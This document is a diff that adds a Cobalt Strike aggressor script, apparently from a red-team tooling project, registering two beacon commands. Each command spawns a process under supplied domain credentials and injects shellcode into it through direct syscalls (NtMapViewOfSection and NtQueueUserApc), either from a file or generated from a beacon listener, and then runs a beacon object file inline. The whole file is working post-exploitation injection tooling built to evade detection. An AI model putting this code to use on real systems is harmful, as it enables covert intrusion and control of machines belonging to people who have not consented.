@@ -1,0 +1,98 @@
+beacon_command_register(
+"static_syscalls_apc_user_shspawn", 
+"Spawn process and use syscalls to execute custom shellcode launch with Nt functions (NtMapViewOfSection -> NtQueueUserApc).", 
+"Synopsis: static_syscalls_apc_shspawn path_to_bin DOMAIN\\User Password Path_to_EXE");
+
+beacon_command_register(
+"static_syscalls_apc_user_spawn", 
+"Spawn process and use syscalls to execute beacon shellcode launch with Nt functions (NtMapViewOfSection -> NtQueueUserApc).", 
+"Synopsis: static_syscalls_apc_spawn listener_name DOMAIN\\User Password Path_to_EXE");
+
+alias static_syscalls_apc_user_shspawn {
+	local('$handle $data $args $sc_data $domain $user $pass $exe');
+
+        # parse arguments
+        # $2 = sc_data
+        # $3 = Domain\User
+        # $4 = password
+        # $5 = executable path
+
+        ($domain, $user) = split('\\\\', $3);
+        $pass            = $4;
+
+        # Escapes single '\' with '\\' so entry.c parses correctly
+        $exe             = strrep($5, '\\', '\\\\');
+
+        if (size(@_) <= 4) {
+        	berror($1, "Not enough arguments.");
+                return;
+        } 
+	
+	# figure out the arch of this session
+	$barch  = barch($1);
+	
+	# read in the right BOF file
+	$handle = openf(script_resource("syscallsapcuserspawn. $+ $barch $+ .o"));
+	$data = readb($handle, -1);
+	closef($handle);
+
+	$sc_handle = openf($2);
+	$sc_data = readb($sc_handle, -1);
+	closef($sc_handle);
+
+	# pack our arguments
+	$args = bof_pack($1, "bZZZZ", $sc_data, $domain, $user, $pass, $exe);
+	
+	btask($1, "Syscalls Spawn and Shellcode APC Injection BOF (@ajpc500)");	
+	btask($1, "Reading shellcode from: $+  $2 and spawning as $domain" . "\\" . "$user");
+
+	# execute it.
+	beacon_inline_execute($1, $data, "go", $args);
+}
+
+alias static_syscalls_apc_user_spawn {
+	local('$handle $data $args $domain $user $pass $exe');
+
+        # parse arguments
+        # $2 = listener
+        # $3 = Domain\User
+        # $4 = password
+        # $5 = executable path
+
+        ($domain, $user) = split('\\\\', $3);
+        $pass            = $4;
+        
+        # Escapes single '\' with '\\' so entry.c parses correctly
+        $exe             = strrep($5, '\\', '\\\\');
+     
+        blog($1, "Spawning and injecting into $exe as $domain" . "\\" . "$user");
+	
+	# figure out the arch of this session
+	$barch  = barch($1);
+
+	# read in the right BOF file
+	$handle = openf(script_resource("syscallsapcuserspawn. $+ $barch $+ .o"));
+	$data = readb($handle, -1);
+	closef($handle);
+
+        if (size(@_) <= 4) {
+        	berror($1, "Not enough arguments.");
+                return;
+        } 
+
+	if (listener_info($2) is $null) {
+		berror($1, "Could not find listener $2");
+	}
+	else {
+		$sc_data = artifact_payload($2, "raw", "x64");
+
+		# pack our arguments
+		$args = bof_pack($1, "bZZZZ", $sc_data, $domain, $user, $pass, $exe);
+
+		btask($1, "Syscalls Spawn and Shellcode APC Injection BOF (@ajpc500)");
+		btask($1, "Using $+  $2  $+ listener for beacon shellcode generation.");
+
+		# execute it.
+		beacon_inline_execute($1, $data, "go", $args);
+	}
+}
